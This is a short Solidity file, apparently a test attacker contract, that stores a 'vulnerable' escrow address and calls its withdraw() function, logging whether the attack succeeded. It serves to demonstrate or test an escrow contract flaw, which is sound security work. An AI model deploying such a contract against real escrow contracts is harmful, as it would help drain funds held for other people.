// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
contract MaliciousSeller{

   address public vulnerableEscrowAddress;

   event MaliciousSellerLogger(string maliciousLog);

    constructor(address escrowAddress){
        vulnerableEscrowAddress = escrowAddress;
    }

    function maliciousCall() public returns (bool){

       (bool success,) = vulnerableEscrowAddress.call(abi.encodeWithSignature("withdraw()"));

       if(success){
            emit MaliciousSellerLogger("attack successful");
       }
       else{
            emit MaliciousSellerLogger("attack unsuccessful");
       }
       return success;

    }

}